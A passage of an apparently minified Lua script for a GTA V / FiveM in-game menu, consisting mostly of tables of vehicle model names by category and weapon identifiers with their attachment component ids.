    end
    if aD > 0 then
        local aE = -1
        local aG, realSpawnName = aC, aE
        table.insert(
            az,
            1,
            {
                menuName = 'Stock',
                data = {
                    ['modid'] = aG,
                    ['realIndex'] = realSpawnName
                }
            }
        )
    end
    return az
end
local aH = {
    'Dinghy',
    'Dinghy2',
    'Dinghy3',
    'Dingh4',
    'Jetmax',
    'Marquis',
    'Seashark',
    'Seashark2',
    'Seashark3',
    'Speeder',
    'Speeder2',
    'Squalo',
    'Submersible',
    'Submersible2',
    'Suntrap',
    'Toro',
    'Toro2',
    'Tropic',
    'Tropic2',
    'Tug'
}
local aI = {
    'Benson',
    'Biff',
    'Cerberus',
    'Cerberus2',
    'Cerberus3',
    'Hauler',
    'Hauler2',
    'Mule',
    'Mule2',
    'Mule3',
    'Mule4',
    'Packer',
    'Phantom',
    'Phantom2',
    'Phantom3',
    'Pounder',
    'Pounder2',
    'Stockade',
    'Stockade3',
    'Terbyte'
}
local aJ = {
    'Blista',
    'Blista2',
    'Blista3',
    'Brioso',
    'Dilettante',
    'Dilettante2',
    'Issi2',
    'Issi3',
    'issi4',
    'Iss5',
    'issi6',
    'Panto',
    'Prarire',
    'Rhapsody'
}
local aK = {
    'CogCabrio',
    'Exemplar',
    'F620',
    'Felon',
    'Felon2',
    'Jackal',
    'Oracle',
    'Oracle2',
    'Sentinel',
    'Sentinel2',
    'Windsor',
    'Windsor2',
    'Zion',
    'Zion2'
}
local aL = {
    'Bmx',
    'Cruiser',
    'Fixter',
    'Scorcher',
    'Tribike',
    'Tribike2',
    'tribike3'
}
local aM = {
    'ambulance',
    'FBI',
    'FBI2',
    'FireTruk',
    'PBus',
    'police',
    'Police2',
    'Police3',
    'Police4',
    'PoliceOld1',
    'PoliceOld2',
    'PoliceT',
    'Policeb',
    'Polmav',
    'Pranger',
    'Predator',
    'Riot',
    'Riot2',
    'Sheriff',
    'Sheriff2'
}
local aN = {
    'Akula',
    'Annihilator',
    'Buzzard',
    'Buzzard2',
    'Cargobob',
    'Cargobob2',
    'Cargobob3',
    'Cargobob4',
    'Frogger',
    'Frogger2',
    'Havok',
    'Hunter',
    'Maverick',
    'Savage',
    'Seasparrow',
    'Skylift',
    'Supervolito',
    'Supervolito2',
    'Swift',
    'Swift2',
    'Valkyrie',
    'Valkyrie2',
    'Volatus'
}
local aO = {
    'Bulldozer',
    'Cutter',
    'Dump',
    'Flatbed',
    'Guardian',
    'Handler',
    'Mixer',
    'Mixer2',
    'Rubble',
    'Tiptruck',
    'Tiptruck2'
}
local aP = {
    'APC',
    'Barracks',
    'Barracks2',
    'Barracks3',
    'Barrage',
    'Chernobog',
    'Crusader',
    'Halftrack',
    'Khanjali',
    'Rhino',
    'Scarab',
    'Scarab2',
    'Scarab3',
    'Thruster',
    'Trailersmall2'
}
local aQ = {
    'Akuma',
    'Avarus',
    'Bagger',
    'Bati2',
    'Bati',
    'BF400',
    'Blazer4',
    'CarbonRS',
    'Chimera',
    'Cliffhanger',
    'Daemon',
    'Daemon2',
    'Defiler',
    'Deathbike',
    'Deathbike2',
    'Deathbike3',
    'Diablous',
    'Diablous2',
    'Double',
    'Enduro',
    'esskey',
    'Faggio2',
    'Faggio3',
    'Faggio',
    'Fcr2',
    'fcr',
    'gargoyle',
    'hakuchou2',
    'hakuchou',
    'hexer',
    'innovation',
    'Lectro',
    'Manchez',
    'Nemesis',
    'Nightblade',
    'Oppressor',
    'Oppressor2',
    'PCJ',
    'Ratbike',
    'Ruffian',
    'Sanchez2',
    'Sanchez',
    'Sanctus',
    'Shotaro',
    'Sovereign',
    'Thrust',
    'Vader',
    'Vindicator',
    'Vortex',
    'Wolfsbane',
    'zombiea',
    'zombieb'
}
local aR = {
    'Blade',
    'Buccaneer',
    'Buccaneer2',
    'Chino',
    'Chino2',
    'clique',
    'Deviant',
    'Dominator',
    'Dominator2',
    'Dominator3',
    'Dominator4',
    'Dominator5',
    'Dominator6',
    'Dukes',
    'Dukes2',
    'Ellie',
    'Faction',
    'faction2',
    'faction3',
    'Gauntlet',
    'Gauntlet2',
    'Hermes',
    'Hotknife',
    'Hustler',
    'Impaler',
    'Impaler2',
    'Impaler3',
    'Impaler4',
    'Imperator',
    'Imperator2',
    'Imperator3',
    'Lurcher',
    'Moonbeam',
    'Moonbeam2',
    'Nightshade',
    'Phoenix',
    'Picador',
    'RatLoader',
    'RatLoader2',
    'Ruiner',
    'Ruiner2',
    'Ruiner3',
    'SabreGT',
    'SabreGT2',
    'Sadler2',
    'Slamvan',
    'Slamvan2',
    'Slamvan3',
    'Slamvan4',
    'Slamvan5',
    'Slamvan6',
    'Stalion',
    'Stalion2',
    'Tampa',
    'Tampa3',
    'Tulip',
    'Vamos,',
    'Vigero',
    'Virgo',
    'Virgo2',
    'Virgo3',
    'Voodoo',
    'Voodoo2',
    'Yosemite'
}
local aS = {
    'BFinjection',
    'Bifta',
    'Blazer',
    'Blazer2',
    'Blazer3',
    'Blazer5',
    'Bohdi',
    'Brawler',
    'Bruiser',
    'Bruiser2',
    'Bruiser3',
    'Caracara',
    'DLoader',
    'Dune',
    'Dune2',
    'Dune3',
    'Dune4',
    'Dune5',
    'Insurgent',
    'Insurgent2',
    'Insurgent3',
    'Kalahari',
    'Kamacho',
    'LGuard',
    'Marshall',
    'Mesa',
    'Mesa2',
    'Mesa3',
    'Monster',
    'Monster4',
    'Monster5',
    'Nightshark',
    'RancherXL',
    'RancherXL2',
    'Rebel',
    'Rebel2',
    'RCBandito',
    'Riata',
    'Sandking',
    'Sandking2',
    'Technical',
    'Technical2',
    'Technical3',
    'TrophyTruck',
    'TrophyTruck2',
    'Freecrawler',
    'Menacer'
}
local aT = {
    'AlphaZ1',
    'Avenger',
    'Avenger2',
    'Besra',
    'Blimp',
    'blimp2',
    'Blimp3',
    'Bombushka',
    'Cargoplane',
    'Cuban800',
    'Dodo',
    'Duster',
    'Howard',
    'Hydra',
    'Jet',
    'Lazer',
    'Luxor',
    'Luxor2',
    'Mammatus',
    'Microlight',
    'Miljet',
    'Mogul',
    'Molotok',
    'Nimbus',
    'Nokota',
    'Pyro',
    'Rogue',
    'Seabreeze',
    'Shamal',
    'Starling',
    'Stunt',
    'Titan',
    'Tula',
    'Velum',
    'Velum2',
    'Vestra',
    'Volatol',
    'Striekforce'
}
local aU = {
    'BJXL',
    'Baller',
    'Baller2',
    'Baller3',
    'Baller4',
    'Baller5',
    'Baller6',
    'Cavalcade',
    'Cavalcade2',
    'Dubsta',
    'Dubsta2',
    'Dubsta3',
    'FQ2',
    'Granger',
    'Gresley',
    'Habanero',
    'Huntley',
    'Landstalker',
    'patriot',
    'Patriot2',
    'Radi',
    'Rocoto',
    'Seminole',
    'Serrano',
    'Toros',
    'XLS',
    'XLS2'
}
local aV = {
    'Asea',
    'Asea2',
    'Asterope',
    'Cog55',
    'Cogg552',
    'Cognoscenti',
    'Cognoscenti2',
    'emperor',
    'emperor2',
    'emperor3',
    'Fugitive',
    'Glendale',
    'ingot',
    'intruder',
    'limo2',
    'premier',
    'primo',
    'primo2',
    'regina',
    'romero',
    'stafford',
    'Stanier',
    'stratum',
    'stretch',
    'surge',
    'tailgater',
    'warrener',
    'Washington'
}
local aW = {
    'Airbus',
    'Brickade',
    'Bus',
    'Coach',
    'Rallytruck',
    'Rentalbus',
    'taxi',
    'Tourbus',
    'Trash',
    'Trash2',
    'WastIndr',
    'PBus2'
}
local aX = {
    'Alpha',
    'Banshee',
    'Banshee2',
    'BestiaGTS',
    'Buffalo',
    'Buffalo2',
    'Buffalo3',
    'Carbonizzare',
    'Comet2',
    'Comet3',
    'Comet4',
    'Comet5',
    'Coquette',
    'Deveste',
    'Elegy',
    'Elegy2',
    'Feltzer2',
    'Feltzer3',
    'FlashGT',
    'Furoregt',
    'Fusilade',
    'Futo',
    'GB200',
    'Hotring',
    'Infernus2',
    'Italigto',
    'Jester',
    'Jester2',
    'Khamelion',
    'Kurama',
    'Kurama2',
    'Lynx',
    'MAssacro',
    'MAssacro2',
    'neon',
    'Ninef',
    'ninfe2',
    'omnis',
    'Pariah',
    'Penumbra',
    'Raiden',
    'RapidGT',
    'RapidGT2',
    'Raptor',
    'Revolter',
    'Ruston',
    'Schafter2',
    'Schafter3',
    'Schafter4',
    'Schafter5',
    'Schafter6',
    'Schlagen',
    'Schwarzer',
    'Sentinel3',
    'Seven70',
    'Specter',
    'Specter2',
    'Streiter',
    'Sultan',
    'Surano',
    'Tampa2',
    'Tropos',
    'Verlierer2',
    'ZR380',
    'ZR3802',
    'ZR3803'
}
local aY = {
    'Ardent',
    'BType',
    'BType2',
    'BType3',
    'Casco',
    'Cheetah2',
    'Cheburek',
    'Coquette2',
    'Coquette3',
    'Deluxo',
    'Fagaloa',
    'Gt500',
    'JB700',
    'JEster3',
    'MAmba',
    'Manana',
    'Michelli',
    'Monroe',
    'Peyote',
    'Pigalle',
    'RapidGT3',
    'Retinue',
    'Savastra',
    'Stinger',
    'Stingergt',
    'Stromberg',
    'Swinger',
    'Torero',
    'Tornado',
    'Tornado2',
    'Tornado3',
    'Tornado4',
    'Tornado5',
    'Tornado6',
    'Viseris',
    'Z190',
    'ZType'
}
local aZ = {
    'Adder',
    'Autarch',
    'Bullet',
    'Cheetah',
    'Cyclone',
    'EntityXF',
    'Entity2',
    'FMJ',
    'GP1',
    'Infernus',
    'LE7B',
    'Nero',
    'Nero2',
    'Osiris',
    'Penetrator',
    'PFister811',
    'Prototipo',
    'Reaper',
    'SC1',
    'Scramjet',
    'Sheava',
    'SultanRS',
    'Superd',
    'T20',
    'Taipan',
    'Tempesta',
    'Tezeract',
    'Turismo2',
    'Turismor',
    'Tyrant',
    'Tyrus',
    'Vacca',
    'Vagner',
    'Vigilante',
    'Visione',
    'Voltic',
    'Voltic2',
    'Zentorno',
    'Italigtb',
    'Italigtb2',
    'XA21'
}
local a_ = {
    'ArmyTanker',
    'ArmyTrailer',
    'ArmyTrailer2',
    'BaleTrailer',
    'BoatTrailer',
    'CableCar',
    'DockTrailer',
    'Graintrailer',
    'Proptrailer',
    'Raketailer',
    'TR2',
    'TR3',
    'TR4',
    'TRFlat',
    'TVTrailer',
    'Tanker',
    'Tanker2',
    'Trailerlogs',
    'Trailersmall',
    'Trailers',
    'Trailers2',
    'Trailers3'
}
local b0 = {
    'Freight',
    'Freightcar',
    'Freightcont1',
    'Freightcont2',
    'Freightgrain',
    'Freighttrailer',
    'TankerCar'
}
local b1 = {
    'Airtug',
    'Caddy',
    'Caddy2',
    'Caddy3',
    'Docktug',
    'Forklift',
    'Mower',
    'Ripley',
    'Sadler',
    'Scrap',
    'TowTruck',
    'Towtruck2',
    'Tractor',
    'Tractor2',
    'Tractor3',
    'TrailerLArge2',
    'Utilitruck',
    'Utilitruck3',
    'Utilitruck2'
}
local b2 = {
    'Bison',
    'Bison2',
    'Bison3',
    'BobcatXL',
    'Boxville',
    'Boxville2',
    'Boxville3',
    'Boxville4',
    'Boxville5',
    'Burrito',
    'Burrito2',
    'Burrito3',
    'Burrito4',
    'Burrito5',
    'Camper',
    'GBurrito',
    'GBurrito2',
    'Journey',
    'Minivan',
    'Minivan2',
    'Paradise',
    'pony',
    'Pony2',
    'Rumpo',
    'Rumpo2',
    'Rumpo3',
    'Speedo',
    'Speedo2',
    'Speedo4',
    'Surfer',
    'Surfer2',
    'Taco',
    'Youga',
    'youga2'
}
local b3 = {
    'Boats',
    'Commercial',
    'Compacts',
    'Coupes',
    'Cycles',
    'Emergency',
    'Helictopers',
    'Industrial',
    'Military',
    'Motorcycles',
    'Muscle',
    'Off-Road',
    'Planes',
    'SUVs',
    'Sedans',
    'Service',
    'Sports',
    'Sports Classic',
    'Super',
    'Trailer',
    'Trains',
    'Utility',
    'Vans'
}
local b4 = {
    aH,
    aI,
    aJ,
    aK,
    aL,
    aM,
    aN,
    aO,
    aP,
    aQ,
    aR,
    aS,
    aT,
    aU,
    aV,
    aW,
    aX,
    aY,
    aZ,
    a_,
    b0,
    b1,
    b2
}
local b5 = {
    'ArmyTanker',
    'ArmyTrailer',
    'ArmyTrailer2',
    'BaleTrailer',
    'BoatTrailer',
    'CableCar',
    'DockTrailer',
    'Graintrailer',
    'Proptrailer',
    'Raketailer',
    'TR2',
    'TR3',
    'TR4',
    'TRFlat',
    'TVTrailer',
    'Tanker',
    'Tanker2',
    'Trailerlogs',
    'Trailersmall',
    'Trailers',
    'Trailers2',
    'Trailers3'
}
local b6 = {
    'WEAPON_KNIFE',
    'WEAPON_KNUCKLE',
    'WEAPON_NIGHTSTICK',
    'WEAPON_HAMMER',
    'WEAPON_BAT',
    'WEAPON_GOLFCLUB',
    'WEAPON_CROWBAR',
    'WEAPON_BOTTLE',
    'WEAPON_DAGGER',
    'WEAPON_HATCHET',
    'WEAPON_MACHETE',
    'WEAPON_FLASHLIGHT',
    'WEAPON_SWITCHBLADE',
    'WEAPON_PISTOL',
    'WEAPON_PISTOL_MK2',
    'WEAPON_COMBATPISTOL',
    'WEAPON_APPISTOL',
    'WEAPON_PISTOL50',
    'WEAPON_SNSPISTOL',
    'WEAPON_HEAVYPISTOL',
    'WEAPON_VINTAGEPISTOL',
    'WEAPON_STUNGUN',
    'WEAPON_FLAREGUN',
    'WEAPON_MARKSMANPISTOL',
    'WEAPON_REVOLVER',
    'WEAPON_MICROSMG',
    'WEAPON_SMG',
    'WEAPON_SMG_MK2',
    'WEAPON_ASSAULTSMG',
    'WEAPON_MG',
    'WEAPON_COMBATMG',
    'WEAPON_COMBATMG_MK2',
    'WEAPON_COMBATPDW',
    'WEAPON_GUSENBERG',
    'WEAPON_MACHINEPISTOL',
    'WEAPON_ASSAULTRIFLE',
    'WEAPON_ASSAULTRIFLE_MK2',
    'WEAPON_CARBINERIFLE',
    'WEAPON_CARBINERIFLE_MK2',
    'WEAPON_ADVANCEDRIFLE',
    'WEAPON_SPECIALCARBINE',
    'WEAPON_BULLPUPRIFLE',
    'WEAPON_COMPACTRIFLE',
    'WEAPON_PUMPSHOTGUN',
    'WEAPON_SAWNOFFSHOTGUN',
    'WEAPON_BULLPUPSHOTGUN',
    'WEAPON_ASSAULTSHOTGUN',
    'WEAPON_MUSKET',
    'WEAPON_HEAVYSHOTGUN',
    'WEAPON_DBSHOTGUN',
    'WEAPON_SNIPERRIFLE',
    'WEAPON_HEAVYSNIPER',
    'WEAPON_HEAVYSNIPER_MK2',
    'WEAPON_MARKSMANRIFLE',
    'WEAPON_GRENADELAUNCHER',
    'WEAPON_GRENADELAUNCHER_SMOKE',
    'WEAPON_RPG',
    'WEAPON_STINGER',
    'WEAPON_FIREWORK',
    'WEAPON_HOMINGLAUNCHER',
    'WEAPON_GRENADE',
    'WEAPON_STICKYBOMB',
    'WEAPON_PROXMINE',
    'WEAPON_BZGAS',
    'WEAPON_SMOKEGRENADE',
    'WEAPON_MOLOTOV',
    'WEAPON_FIREEXTINGUISHER',
    'WEAPON_PETROLCAN',
    'WEAPON_SNOWBALL',
    'WEAPON_FLARE',
    'WEAPON_BALL'
}
local b7 = {
    Melee = {
        BaseballBat = {
            id = 'weapon_bat',
            name = '~h~~p~» ~w~Baseball Bat',
            bInfAmmo = false,
            mods = {}
        },
        BrokenBottle = {
            id = 'weapon_bottle',
            name = '~h~~p~» ~w~Broken Bottle',
            bInfAmmo = false,
            mods = {}
        },
        Crowbar = {
            id = 'weapon_Crowbar',
            name = '~h~~p~» ~w~Crowbar',
            bInfAmmo = false,
            mods = {}
        },
        Flashlight = {
            id = 'weapon_flashlight',
            name = '~h~~p~» ~w~Flashlight',
            bInfAmmo = false,
            mods = {}
        },
        GolfClub = {
            id = 'weapon_golfclub',
            name = '~h~~p~» ~w~Golf Club',
            bInfAmmo = false,
            mods = {}
        },
        BrassKnuckles = {
            id = 'weapon_knuckle',
            name = '~h~~p~» ~w~Brass Knuckles',
            bInfAmmo = false,
            mods = {}
        },
        Knife = {
            id = 'weapon_knife',
            name = '~h~~p~» ~w~Knife',
            bInfAmmo = false,
            mods = {}
        },
        Machete = {
            id = 'weapon_machete',
            name = '~h~~p~» ~w~Machete',
            bInfAmmo = false,
            mods = {}
        },
        Switchblade = {
            id = 'weapon_switchblade',
            name = '~h~~p~» ~w~Switchblade',
            bInfAmmo = false,
            mods = {}
        },
        Nightstick = {
            id = 'weapon_nightstick',
            name = '~h~~p~» ~w~Nightstick',
            bInfAmmo = false,
            mods = {}
        },
        BattleAxe = {
            id = 'weapon_battleaxe',
            name = '~h~~p~» ~w~Battle Axe',
            bInfAmmo = false,
            mods = {}
        }
    },
    Handguns = {
        Pistol = {
            id = 'weapon_pistol',
            name = '~h~~p~» ~w~Pistol',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~» ~w~Default Magazine',
                        id = 'COMPONENT_PISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~p~» ~w~Extended Magazine',
                        id = 'COMPONENT_PISTOL_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~» ~w~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~» ~w~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP_02'
                    }
                }
            }
        },
        PistolMK2 = {
            id = 'weapon_pistol_mk2',
            name = '~h~~p~» ~w~Pistol MK 2',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~» ~w~Default Magazine',
                        id = 'COMPONENT_PISTOL_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~p~» ~w~Extended Magazine',
                        id = 'COMPONENT_PISTOL_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~p~» ~w~Tracer Rounds',
                        id = 'COMPONENT_PISTOL_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~p~» ~w~Incendiary Rounds',
                        id = 'COMPONENT_PISTOL_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~p~» ~w~Hollow Point Rounds',
                        id = 'COMPONENT_PISTOL_MK2_CLIP_HOLLOWPOINT'
                    },
                    {
                        name = '~h~~p~» ~w~FMJ Rounds',
                        id = 'COMPONENT_PISTOL_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~» ~w~Mounted Scope',
                        id = 'COMPONENT_AT_PI_RAIL'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~» ~w~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~» ~w~Compensator',
                        id = 'COMPONENT_AT_PI_COMP'
                    },
                    {
                        name = '~h~~p~» ~w~Suppessor',
                        id = 'COMPONENT_AT_PI_SUPP_02'
                    }
                }
            }
        },
        CombatPistol = {
            id = 'weapon_combatpistol',
            name = '~h~Combat Pistol',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~» ~w~Default Magazine',
                        id = 'COMPONENT_COMBATPISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~p~» ~w~Extended Magazine',
                        id = 'COMPONENT_COMBATPISTOL_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~» ~w~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~» ~w~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP'
                    }
                }
            }
        },
        APPistol = {
            id = 'weapon_appistol',
            name = 'AP Pistol',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~» ~w~Default Magazine',
                        id = 'COMPONENT_APPISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~p~» ~w~Extended Magazine',
                        id = 'COMPONENT_APPISTOL_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~» ~w~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~» ~w~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP'
                    }
                }
            }
        },
        StunGun = {
            id = 'weapon_stungun',
            name = '~h~~p~» ~w~Stun Gun',
            bInfAmmo = false,
            mods = {}
        },
        Pistol50 = {
            id = 'weapon_pistol50',
            name = '~h~~p~» ~w~Pistol .50',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~» ~w~Default Magazine',
                        id = 'COMPONENT_PISTOL50_CLIP_01'
                    },
                    {
                        name = '~h~~p~» ~w~Extended Magazine',
                        id = 'COMPONENT_PISTOL50_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~» ~w~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~» ~w~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP_02'
                    }
                }
            }
        },
        SNSPistol = {
            id = 'weapon_snspistol',
            name = '~h~~p~» ~w~SNS Pistol',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~» ~w~Default Magazine',
                        id = 'COMPONENT_SNSPISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~p~» ~w~Extended Magazine',
                        id = 'COMPONENT_SNSPISTOL_CLIP_02'
                    }
                }
            }
        },
        SNSPistolMkII = {
            id = 'weapon_snspistol_mk2',
            name = '~h~~p~» ~w~SNS Pistol Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~» ~w~Default Magazine',
                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~p~» ~w~Extended Magazine',
                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~p~» ~w~Tracer Rounds',
                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~p~» ~w~Incendiary Rounds',
                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~p~» ~w~Hollow Point Rounds',
                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_HOLLOWPOINT'
                    },
                    {
                        name = '~h~~p~» ~w~FMJ Rounds',
                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~» ~w~Mounted Scope',
                        id = 'COMPONENT_AT_PI_RAIL_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~» ~w~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH_03'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~» ~w~Compensator',
                        id = 'COMPONENT_AT_PI_COMP_02'
                    },
                    {
                        name = '~h~~p~» ~w~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP_02'
                    }
                }
            }
        },
        HeavyPistol = {
            id = 'weapon_heavypistol',
            name = '~h~~p~» ~w~Heavy Pistol',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~» ~w~Default Magazine',
                        id = 'COMPONENT_HEAVYPISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~p~» ~w~Extended Magazine',
                        id = 'COMPONENT_HEAVYPISTOL_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~» ~w~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~» ~w~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP'
                    }
                }
            }
        },
        VintagePistol = {
            id = 'weapon_vintagepistol',
            name = '~h~~p~» ~w~Vintage Pistol',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~» ~w~Default Magazine',
                        id = 'COMPONENT_VINTAGEPISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~p~» ~w~Extended Magazine',
                        id = 'COMPONENT_VINTAGEPISTOL_CLIP_02'
                    }
                },
                BarrelAttachments = {
                    {
                        'Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP'
                    }
                }
            }
        },
        FlareGun = {
            id = 'weapon_flaregun',
            name = '~h~~p~» ~w~Flare Gun',
            bInfAmmo = false,
            mods = {}
        },
        MarksmanPistol = {
            id = 'weapon_marksmanpistol',
            name = '~h~~p~» ~w~Marksman Pistol',
            bInfAmmo = false,
            mods = {}
        },
        HeavyRevolver = {
            id = 'weapon_revolver',
            name = '~h~~p~» ~w~Heavy Revolver',
            bInfAmmo = false,
            mods = {}
        },
        HeavyRevolverMkII = {
            id = 'weapon_revolver_mk2',
            name = '~h~~p~» ~w~Heavy Revolver Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~» ~w~Default Rounds',
                        id = 'COMPONENT_REVOLVER_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~p~» ~w~Tracer Rounds',
                        id = 'COMPONENT_REVOLVER_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~p~» ~w~Incendiary Rounds',
                        id = 'COMPONENT_REVOLVER_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~p~» ~w~Hollow Point Rounds',
                        id = 'COMPONENT_REVOLVER_MK2_CLIP_HOLLOWPOINT'
                    },
                    {
                        name = '~h~~p~» ~w~FMJ Rounds',
                        id = 'COMPONENT_REVOLVER_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~» ~w~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~p~» ~w~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~» ~w~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~» ~w~Compensator',
                        id = 'COMPONENT_AT_PI_COMP_03'
                    }
                }
            }
        },
        DoubleActionRevolver = {
            id = 'weapon_doubleaction',
            name = '~h~~p~» ~w~Double Action Revolver',
            bInfAmmo = false,
            mods = {}
        },
        UpnAtomizer = {
            id = 'weapon_raypistol',
            name = '~h~~p~» ~w~Up-n-Atomizer',
            bInfAmmo = false,
            mods = {}
        }
    },
    SMG = {
        MicroSMG = {
            id = 'weapon_microsmg',
            name = '~h~~p~» ~w~Micro SMG',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~» ~w~Default Magazine',
                        id = 'COMPONENT_MICROSMG_CLIP_01'
                    },
                    {
                        name = '~h~~p~» ~w~Extended Magazine',
                        id = 'COMPONENT_MICROSMG_CLIP_02'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~» ~w~Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~» ~w~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~» ~w~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                }
            }
        },
        SMG = {
            id = 'weapon_smg',
            name = '~h~~p~» ~w~SMG',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~» ~w~Default Magazine',
                        id = 'COMPONENT_SMG_CLIP_01'
                    },
                    {
                        name = '~h~~p~» ~w~Extended Magazine',
                        id = 'COMPONENT_SMG_CLIP_02'
                    },
                    {
                        name = '~h~~p~» ~w~Drum Magazine',
                        id = 'COMPONENT_SMG_CLIP_03'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~» ~w~Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~» ~w~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~» ~w~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP'
                    }
                }
            }
        },
        SMGMkII = {
            id = 'weapon_smg_mk2',
            name = '~h~~p~» ~w~SMG Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~» ~w~Default Magazine',
                        id = 'COMPONENT_SMG_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~p~» ~w~Extended Magazine',
                        id = 'COMPONENT_SMG_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~p~» ~w~Tracer Rounds',
                        id = 'COMPONENT_SMG_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~p~» ~w~Incendiary Rounds',
                        id = 'COMPONENT_SMG_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~p~» ~w~Hollow Point Rounds',
                        id = 'COMPONENT_SMG_MK2_CLIP_HOLLOWPOINT'
                    },
                    {
                        name = '~h~~p~» ~w~FMJ Rounds',
                        id = 'COMPONENT_SMG_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~» ~w~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS_SMG'
                    },
                    {
                        name = '~h~~p~» ~w~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_02_SMG_MK2'
                    },
                    {
                        name = '~h~~p~» ~w~Medium Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL_SMG_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~» ~w~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~p~» ~w~Default',
                        id = 'COMPONENT_AT_SB_BARREL_01'
                    },
                    {
                        name = '~h~~p~» ~w~Heavy',
                        id = 'COMPONENT_AT_SB_BARREL_02'
